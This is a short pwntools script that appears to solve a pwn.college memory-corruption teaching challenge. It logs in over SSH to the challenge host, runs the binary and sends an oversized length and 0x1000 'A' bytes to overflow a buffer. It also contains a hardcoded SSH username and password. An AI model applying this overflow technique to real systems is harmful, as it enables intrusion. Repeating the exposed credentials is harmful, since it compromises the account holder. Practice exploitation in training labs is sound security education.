from pwn import *

e = ELF('./babymem_level1_teaching1')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
p = s.run('/babymem_level1_teaching1')

p.sendline(str(0x1000))
p.send(b'A'*0x1000)

p.interactive()